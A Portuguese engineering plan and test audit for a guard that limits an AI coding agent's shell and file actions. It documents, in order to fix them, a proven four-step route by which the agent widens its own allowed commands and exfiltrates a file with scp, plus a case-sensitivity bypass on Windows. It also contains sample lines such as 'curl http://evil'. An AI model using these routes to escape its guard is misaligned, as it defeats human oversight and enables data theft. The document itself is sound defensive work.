# Plano v2 — repriorização pós-parecer MAR

**Substitui a seção "Sequenciamento sugerido" de
[`ROADMAP-dogfood-venv-windows.correction.backlog.md`](ROADMAP-dogfood-venv-windows.correction.backlog.md).**
O backlog continua sendo a fonte do *conteúdo* de cada item (evidência,
`file:line`, fix proposto, comando de verificação); este documento redefine
**ordem, escopo e critério de pronto**, à luz de
[`…correction.parecer-MAR.md`](ROADMAP-dogfood-venv-windows.correction.parecer-MAR.md)
e da auditoria dos testes descrita na §6.

Criado em 2026-07-26. Mapeamento: `U1`…`U9` do parecer = `Item 1`…`Item 9` do
backlog; `U10` = seção "Decisão pendente"; `U11` = seção "Sequenciamento".

## Estado da entrega

| Onda | Itens | Onde | Estado |
|---|---|---|---|
| — | 1, 2 | [PR #27](https://github.com/dseto/harness-creator/pull/27) (merge `42f4eb1`) | ✅ em `main` |
| **0** | 0 | [PR #28](https://github.com/dseto/harness-creator/pull/28) | ✅ entregue |
| **1** | 1b, 5 | PR #28 | ✅ entregue |
| — | B1, B2, B3 (auditoria) | PR #28 | ✅ entregue |
| **2** | 3, 4 | branch `feat/ondas-2-5` | ✅ entregue |
| **3** | 6, 8, contagem na CLI | idem | ✅ entregue |
| **4** | 7 | idem | ✅ entregue |
| **5** | decidir B vs C | — | **gate instrumentado, decisão pendente** |

Suíte: **840 testes** verdes (790 antes da linha), `ruff check src tests`
limpo. (Falha pré-existente e não relacionada em
`tests/e2e/test_contract_flow.py::test_contract_flow_end_to_end` — mojibake
cp1252 no capture de subprocess, reproduz na `main` limpa.)

### O que as ondas 2–4 entregaram, e as duas adaptações do parecer

As duas adaptações que separavam `adaptar` de `implementar` foram cumpridas
**antes** de implementar, não depois:

- **U4 (1) — o floor avalia bruto E normalizado.** `is_floor_bash_command`
  passou a casar também a forma normalizada em cada janela, então
  `.venv/Scripts/git.exe push` e `.venv/Scripts/twine.exe upload` são deny.
  Sem isso o Item 4 converteria um furo latente em furo alcançável.
- **U4 (2) — `uv run --with` definido.** Decisão: **não normaliza**. Se o token
  seguinte a `run` começa com `-`, a forma não é equivalente à nua (`--with`
  traz instalação vinda da rede), então o comando cai no default-deny.
- **U3 — cross-check de gramática.** `extra_allowed_commands_grammar_problem`
  compara a leitura do pyyaml com a do parser mínimo, e `compile-session` avisa
  em stderr (mais a chave `extra_allowed_commands_grammar_problem` no JSON).

Escopo estendido além do texto dos itens, com razão registrada:

- O Item 8 nomeia só o `verify_cmd`, mas lint/typecheck/build e o comando de
  instalação têm o mesmo defeito de match exato. Corrigir um e deixar os outros
  recriaria o bug pelo lado.
- `source <venv>/activate && <cmd>` **continua deny** — o item o lista entre as
  linhas a inverter, mas `source` executa o conteúdo de um arquivo no shell
  corrente, o que não é forma de invocação de binário. Com a normalização, a
  ativação deixou de ser necessária.
- `harness profile set` **não** entrou em `_HARNESS_SUBCOMMANDS`: `test_command`
  alimenta a superfície de comando compilada, então dar o comando ao agente
  reabriria a rota de auto-ampliação que o Item 0 fechou.

### Onda 5 — o gate, agora executável

O que faltava para decidir B vs C não era desenho, era **dado**: quantos ciclos
uma sessão real ainda gasta depois das ondas 2–4. Esse número passou a ser
contado (`harness.metrics`, exposto em `harness status`), em vez de reconstruído
à mão a partir de transcrição.

Procedimento do gate:

1. Instalar o harness num repo Python **com venv**, no Windows, e trabalhar um
   contrato real de ponta a ponta.
2. Ao fim, `harness status --dir <alvo>` e ler `friction.disable_enable_cycles`.
3. **Zero ou perto de zero → postura C** (nenhuma CLI nova), e o Item 9 é
   descartado em definitivo. Número que ainda incomoda → **postura B**
   (`harness allow-command` rodável só pelo usuário, negada ao agente pelo
   guard), com as mitigações do Item 9.

A postura A permanece fora da mesa (§2). E vale reter a §7: a contagem que
ORDENOU as ondas está possivelmente contaminada, porque não há registro de
quantas tool calls passaram sem guard enquanto o fail-open do Item 1 podia estar
ativo. A contagem nova não tem esse problema — é por isso que ela precede o
gate, e não o contrário.

---

## 1. O que mudou antes de qualquer repriorização: as premissas foram medidas

O parecer declara textualmente que **"não executou o guard nem leu o código por
conta própria"**, e por isso marca `[premissa]` em toda inferência de
comportamento. Cinco dessas premissas eram load-bearing — sustentavam um
`rejeitar`, uma adaptação obrigatória e um "risco a verificar antes da onda 2".
Todas foram resolvidas por leitura de código e execução real antes de mexer na
ordem, porque repriorizar sobre premissa é herdar condicionalidade evitável.

| # | Premissa do parecer | Onde | Resultado | Efeito |
|---|---|---|---|---|
| P1 | `harness disable` **não** é executável pelo agente | U9 premissa 1 | **CONFIRMADA, e mais forte** | Não é só ausência de allowlist: `disable` é **floor incondicional** (`boundary_guard.py`, `FLOOR_DISABLE_SEQUENCES`), nas duas formas de invocação, mais o redirect que criaria o sentinel. O agente não consegue se auto-desativar. Os ~13 ciclos foram humanos. |
| P2 | `harness task add-file` **não** aceita paths sob `.harness/` | U9 premissa 2 / nota subordinada de U3 | **FALSIFICADA** | `add_task_file` validava **só** backtick e vírgula. Aceitava qualquer path. |
| P3 | O deny de `Write .harness/harness.yaml` é por superfície de contrato | idem | **CONFIRMADA** | `DOCS_SURFACE_EXCLUDED_PATHS` só o tirava da allowlist de `docs/**`; ele caía no check de superfície. Não havia deny incondicional. |
| P4 | O floor casa por **sequência de tokens** | U4 contra | **CONFIRMADA, com escopo menor que o alegado** | Ver §3. |
| P5 | O `boundary_guard` gerado já é fail-closed internamente | U1 | **CONFIRMADA** | Mantém o diagnóstico de U1: a camada corrigível é o lançador. |

P2 + P3 juntas são a hipótese que o parecer agendou como *"verificação barata,
junto da onda 1"* e classificou como **"risco a verificar antes da onda 2 — não
é tese verificada; é hipótese com teste definido"**. O teste foi executado. A
hipótese se confirmou, e era pior do que o parecer supôs: a rota **não dependia
do Item 3**.

---

## 2. Item 0 — rota de auto-ampliação de superfície de comando

**Severidade: CRÍTICA. Bloqueava a onda 2. Independia de todo o resto do
backlog.**

### Prova de execução

Repo sintético, contrato aprovado, `boundary_guard` gerado pelo HEAD, payloads
`PreToolUse` reais via stdin. Baseline:

```
[Bash] scp segredo.txt user@host:/tmp        -> deny  (fora da superficie compilada)
[Write] .harness/harness.yaml                -> deny  (fora da superficie do contrato ativo)
[Bash] harness task add-file T-01 ...        -> allow (subcomando `task` liberado)
```

Cadeia executada — **4 tool calls, todas `allow`, nenhum toque humano**:

| # | Tool call | Decisão | Efeito |
|---|---|---|---|
| 1 | `harness task add-file T-01 .harness/harness.yaml` | `allow` | `.harness/harness.yaml` entra em `files[]` da T-01 |
| 2 | `Write .harness/harness.yaml` | `allow` ← *era deny* | agente escreve `governance.extra_allowed_commands: [scp, ssh]` |
| 3 | `harness compile-session` | `allow` | re-bakeia: `EXTRA_ALLOWED_COMMANDS = ['scp', 'ssh']` |
| 4 | `scp segredo.txt user@host:/tmp` | `allow` ← *era deny* | exfiltração |

Controle: `git push origin main` continua `deny` — o floor **não** foi
atravessado. É exatamente essa a medida da exposição: **tudo o que o floor não
enumera**. Por confissão da própria fonte em U9, isso inclui `ssh`, `scp`,
`rsync`, `nc`, `docker run`, `certutil -urlcache`, `Invoke-Expression` e
`python -c "import urllib.request…"`.

### Consequências para o parecer

1. **A razão 1 de U9 perde o fundamento comparativo.** A postura A não *criaria
   o primeiro* caminho de auto-ampliação de superfície de comando — ele já
   existia. O `rejeitar` de U9 **se mantém**, e pela própria lógica do parecer,
   que antecipou este cenário: *"se a rota existir, o eixo B manda **fechá-la**,
   não sancionar uma segunda. Institucionalizar a perda do gate porque ele já
   vazou por acidente é o inverso do critério do pedido."* O fundamento passa
   de "cria o primeiro" para "amplia superfície de comando sem gate, seja a
   primeira via ou a segunda".
2. **O Item 3 não criava o furo — encurtava-o.** Com runtime-read, o passo 3
   (`compile-session`) desaparece e a cadeia cai de 4 para 3 calls. Isso
   confirma a leitura do parecer (*"se a rota existir, ela é furo hoje,
   independentemente de U3"*) e **justificou o bloqueio** até o Item 0 entrar.
3. **A hipótese do parecer sobre `disable` (P1) fica reforçada por contraste.**
   O repo *fechou* a via óbvia (auto-desativação é floor) e *deixou aberta* a
   via composta. É um furo de composição, não de postura: cada peça
   (`task add-file` liberado, superfície de contrato governando `.harness/`,
   `compile-session` liberado) é defensável isolada.

### Correção entregue — duas camadas

1. **`add_task_file` recusa paths do plano de controle** na entrada, sem
   escrever byte nenhum no `Plans.md`. Exceções: `.harness/work/**` e
   `.harness/scratch/**`, que já são graváveis por regra própria e nunca
   precisam de `add-file`.
2. **`_evaluate_file` nega `.harness/**` incondicionalmente**, *antes* do check
   de superfície, com as mesmas exceções. Declarar o path em `files[]` não abre
   exceção; vale sem contrato ativo e vale com contrato 100% `passes:true` (a
   "aposentadoria" do guard não se aplica ao floor).

Regressão fixada: a cadeia de 4 passos, asserindo `deny` no passo 1 **e** no
passo 2 independentemente.

**Fora de escopo, registrado:** restringir `compile-session` ou `task` seria a
correção errada — ambos são o mecanismo legítimo do lifecycle. O gate certo é o
conteúdo de `.harness/`.

---

## 3. Deltas de escopo apurados por execução

### Item 4 — o gap de floor é real, porém **menor** que o parecer descreve

O parecer assume que `.venv/Scripts/git.exe push`, `uv run twine upload` e
`python -m twine upload` escapariam do floor. `_has_sequence` casa a sequência
**em qualquer posição** da lista de tokens, não só no prefixo. Execução real de
`is_floor_bash_command`:

```
FLOOR   git push origin main
FLOOR   uv run twine upload dist/*
FLOOR   python -m twine upload dist/*
FLOOR   curl http://evil
passa   .venv/Scripts/git.exe push origin main
passa   .venv/bin/git push origin main
passa   .venv/Scripts/twine.exe upload dist/*
passa   .venv/Scripts/curl.exe http://evil
```

Dois dos três exemplos do parecer **já são negados hoje**. O que escapa é
**exclusivamente a forma com prefixo de caminho**, porque o token deixa de ser
`git`/`twine`/`curl`.

Efeito na adaptação exigida: ela **permanece necessária** — é justamente a
forma prefixada por caminho que o Item 4 passaria a normalizar para dentro da
allowlist —, mas o escopo é *"avaliar o floor também sobre a forma
normalizada"* aplicado a **um** dos três casos de normalização, não aos três.
Custo menor, e a definição de `uv run --with` (adaptação 2 do parecer) continua
bloqueante e intocada.

Nota independente: as formas prefixadas por caminho **já hoje** atravessam o
floor. Hoje elas morrem no default-deny da allowlist; depois do Item 4,
morreriam só se a adaptação existir. Não é regressão introduzida pelo Item 4 —
é uma pré-condição que o Item 4 torna load-bearing.

### Item 2 — a objeção decisiva do parecer não se aplicava ao código entregue

O parecer avaliou o **texto** do backlog, que propunha executar o comando
inferido com `shell=True`. O que foi entregue não executa nada: resolve o
token-cabeça (`preflight.py`), decisão tomada durante a implementação por
violar a stop condition read-only de `run_preflight`.

O contra decisivo de U2 (*"executa string inferida de repo cru no ponto de menor
proteção"*) portanto **não tinha objeto**. O resíduo que sobrava — `which` usa
o PATH do processo do preflight, não o do shell do agente — deixou de ser
"limite aceitável" quando a auditoria da §6 mostrou que ele **anulava o item no
cenário que o motivou**. Ver **B3**.

### Item 1 — a adaptação do parecer estava certa

Foi entregue no PR #27 o bake de `sys.executable` + check no `doctor`. O parecer
disse, com razão, que isso *"não fecha o fail-open, só muda a causa dele"*: se o
interpretador bakeado sumir, o processo continua morrendo com exit ≠ 2 e a tool
call continua passando. E o contra de frequência era real — bakear caminho
absoluto troca "PATH divergente" (acidente) por "venv recriado" (rotina) como
gatilho.

Resíduo entregue como **Item 1b**: sufixo `|| exit 2` no próprio `command`.
Só ele converte fail-open em fail-closed. O Item 8 depende dele (U8: a
neutralidade de eixo B do Item 8 é condicional a o guard efetivamente rodar).

---

## 4. Ordenação

Critério mantido do backlog — `(severidade, fricção eliminada ÷ esforço)` — com
as três correções que o parecer impôs: promover o Item 5, adiar o Item 3 até o
Item 0, e instrumentar contagem antes do gate de decisão.

| Onda | Itens | Racional |
|---|---|---|
| **0** ✅ | **Item 0** (novo) | Rota de auto-ampliação provada por execução. Bloqueava a onda 2. Cadeia de 4 passos reexecutada contra o guard corrigido, negada nas duas camadas. |
| **1** ✅ | **Item 1b** · **Item 5** (promovido) · *Item 2b (LOW, absorvido por B3)* | 1b é pré-condição do eixo B e do Item 8. Item 5 é esforço S, mata um ciclo documentado e **não move nenhuma regra** — o parecer apontou corretamente que deixá-lo na onda 3 contrariava o critério declarado. |
| **2** | **Item 3** (+ validação de gramática no `compile-session`) · **Item 4** (+ floor sobre a forma normalizada, escopo §3; + definição de `uv run --with` fechada **antes** de implementar) | O volume da fricção. Desbloqueado pela onda 0. |
| **3** | **Item 6** (+ nota de desenho) · **Item 8** · **instrumentação de contagem na CLI** | Item 8 só aqui: depende do Item 1b. A contagem vive em `disable`/`enable`/`compile-session` — os ciclos ocorrem com o harness **desligado**, então contador em hook mediria a janela errada. |
| **4** | **Item 7** (escapes rederivados, regra de scriptblock uniforme, redirecionamento tratado) | Mantido na onda 4, mas ver a ressalva do parecer: fricção *observada* subestima um caminho abandonado por inutilizável. |
| **5** | Gate de medição · decisão **B vs C** | Item 9 **rejeitado**, com fundamento reforçado (§2). A postura A sai da mesa; o que resta é escolha de muito menor consequência. |

### Mudanças em relação ao sequenciamento do backlog

- **Item 0 criado** e posto à frente de tudo — não existia no backlog nem no
  parecer como unidade; nasceu da verificação que o parecer agendou.
- **Item 5 promovido** da onda 3 para a onda 1 (correção do parecer, U11).
- **Item 3 condicionado** ao Item 0 (consequência do §2.2) — **desbloqueado**.
- **Item 2 encerrado**, resíduo rebaixado a 2b LOW (§3) e depois **reaberto e
  fechado como B3** (§6), quando a auditoria mostrou que o resíduo não era
  cosmético.
- **Item 1 reaberto** como 1b (correção do parecer, U1) e entregue.
- **Onda 5 reduzida** a B vs C (correção do parecer, U10) — e a
  condicionalidade que o parecer anexava a essa redução **caiu**: ela dependia
  de `disable` não ser executável pelo agente, o que P1 confirmou.
- **Contagem instrumentada** entrou na onda 3 (correção do parecer, U10).

---

## 5. Veredictos consolidados

| Item | Parecer | Após verificação | Estado |
|---|---|---|---|
| **0** (novo) | — | **implementar, P0** | ✅ entregue (PR #28) |
| 1 | `adaptar` | `adaptar` — confirmado | ✅ entregue (#27 + 1b no #28) |
| 2 | `adaptar` | **`implementar`** — objeção sem objeto; resíduo virou B3 | ✅ entregue (#27 + B3 no #28) |
| 3 | `adaptar` | `adaptar` + **desbloqueado** | ✅ entregue (onda 2, com o cross-check de gramática) |
| 4 | `adaptar` | `adaptar`, **escopo reduzido** | ✅ entregue (onda 2, com o floor sobre a forma normalizada) |
| 5 | `implementar` | `implementar` — **promovido à onda 1** | ✅ entregue (PR #28) |
| 6 | `implementar` | `implementar` | ✅ entregue (onda 3) |
| 7 | `adaptar` | `adaptar` | ✅ entregue (onda 4) |
| 8 | `implementar` | `implementar`, **depende do 1b** | ✅ entregue (onda 3, estendido a lint/build/install) |
| 9 | `rejeitar` (condicional) | **`rejeitar` (incondicional)** | encerrado — o que resta é B vs C, no gate da onda 5 |

O `rejeitar` do Item 9 deixa de ser condicional: as duas evidências que o
parecer nomeou como falsificadoras foram procuradas. P1 **não** falsificou (o
agente não executa `disable`). P2 falsificou o "primeiro" — e o parecer já havia
declarado que, nesse mundo, o veredicto se re-funda em *"fechar a rota, não
sancionar uma segunda"*. É o que o Item 0 fez.

---

## 6. Auditoria dos testes pelo comitê MAR (2026-07-26, pós-entrega)

Com as ondas 0 e 1 entregues e **721 testes verdes**, o comitê MAR foi rodado
sobre uma pergunta distinta da do parecer anterior: **os testes verificam que os
problemas foram resolvidos, ou apenas que o código novo funciona?**

Etapa `testes_vs_problemas`, standalone (sem gate anti-cascata), threshold 4.0
assumido por ausência de `mar/config.toml`. Trilha completa em
`…\scratchpad\mar\etapa_testes_vs_problemas\`.

**Veredicto: `nota_final` 2, `decisao` REESCREVER.** As três personas cegas
convergiram após a rodada de debate: 4 / 2 / 3 → **2 / 2 / 2**. O Verificador
desceu de 4 para 2 ao reconhecer que sua régua media fidelidade descritiva, não
poder de detecção — que é a régua do pedido.

### Três defeitos de código, nenhum visível na suíte verde

| # | Defeito | Estado |
|---|---|---|
| **B1** | `is_floor_control_plane_path` era prefixo case-sensitive e não casava path absoluto — a cadeia do Item 0 reabria com `.Harness/` no Windows | ✅ **CORRIGIDO** |
| **B2** | Nenhum teste de instalação assertava o sufixo `\|\| exit 2` no `settings.json` gravado; só o unitário de `hook_command()` | ✅ **CORRIGIDO** |
| **B3** | Preflight rodado com venv **ativado** resolve `pytest` dentro do venv → PASS, enquanto a Bash tool do agente (sem ativação) não resolve — o cenário exato do dogfood passava | ✅ **CORRIGIDO** |

**B1, provado por execução:** `add-file .Harness/harness.yaml` foi **aceito** e
o `Write` subsequente devolveu **allow**, com `.harness/harness.yaml` minúsculo
sendo `deny` no mesmo repo. No Windows os dois são o mesmo arquivo
(`Path.resolve()` confirma). Correção: match por **segmento**,
**case-insensitive**, com `\` convertido **antes** do `normpath`.

**B2:** dois testes sobre os três instaladores, o segundo de **desfecho** — pega
o comando gravado, corrompe o script do hook e exige exit 2. A quebra é erro de
*sintaxe*, não script ausente: `python script_ausente.py` já sai 2 pelo próprio
Python e não discriminaria nada. Discriminação confirmada por teste de mutação.

**B3:** regra nova, independente de qual terminal rodou o preflight — repo COM
venv + comando não ancorado nele → WARNING. Lançadores que gerenciam o próprio
ambiente (`uv run`, `poetry run`, `tox`) ficam de fora. Correção adicional
descoberta ao escrever o teste do simétrico: `head` em forma de caminho precisa
ser resolvido por existência em disco, não por `shutil.which` — senão o usuário
que seguisse a mensagem de fix receberia um WARNING impossível de silenciar.

### O que B1 ensina, e que vale mais que o fix

As duas camadas do Item 0 foram construídas deliberadamente separadas, com a
justificativa escrita de que *"uma camada só reproduziria o erro que criou o
furo"*. Mas ambas chamam o **mesmo predicado** — um defeito nele derruba as duas
juntas. Não eram duas barreiras: eram **uma barreira instanciada duas vezes**. O
Item 0 reproduziu o furo de composição um andar abaixo daquele que existia para
reparar. Separação de camadas só vale se as camadas puderem falhar de forma
independente.

### A evidência que não protegeu nada

A "prova de execução real" usada para fechar o Item 0 percorreu `.harness/`
minúsculo e passou — **com o furo aberto, na mesma máquina, no mesmo commit**.
Execução manual é evidência de entrega, não guarda de regressão, e não cobre nem
o presente quando a variante testada é escolhida por quem escreveu o fix.

### Erros de método na aferição original

- Respondeu-se sistematicamente *"o teste falha se o código for revertido?"*
  quando a pergunta era *"se o problema voltar?"*.
- A segunda pergunta do critério — *"existe caminho pelo qual o problema ainda
  ocorre sem teste falhar?"* — nunca foi enunciada, só reclassificada como
  "limite conhecido", que é concessão descritiva, não veredicto.
- O argumento *"fechados os passos 1 e 2, os passos 3 e 4 são inalcançáveis"*
  era inválido: exigia premissas de completude não estabelecidas, e o bypass por
  caixa o refutou na prática.

### Falha de setup da própria auditoria, registrada

O `pedido_original.md` se declarava completo e **omitiu
`tests/test_stop_hook.py`** do dump de código, induzindo as três personas ao
mesmo falso-positivo ("não há teste de instalação do stop_hook"). O teste
existe. A alegação foi tratada como correta no mérito pelo Juiz.

### Estado do gate

A etapa ficou com os **achados endereçados, não com o gate fechado**: os três
defeitos foram corrigidos, mas não houve tentativa 2 do comitê. Observação do
Juiz que vale reter: o rascunho atingiria ≥ 4 **sem nenhuma mudança de código**,
bastando responder honestamente "não" nos Itens 0 e 2. O que reprovou não foi a
existência das lacunas — foi afirmar que elas não existiam no item P0.

---

## 7. Observação de método que sobrevive

O parecer registra uma observação de segunda ordem que a verificação **não**
resolve: se o fail-open do Item 1 ocorreu na sessão real — e não há evidência
para afirmar nem descartar —, parte das tool calls passou sem guard, e a
contagem de fricção que ordena as ondas está parcialmente contaminada. Denies
que não aconteceram não viraram ciclos.

Isso não afeta os achados de código (todos verificados por leitura e execução),
mas afeta a **métrica de priorização**. É mais uma razão para a instrumentação
de contagem da onda 3 vir antes do gate da onda 5, e não depois.
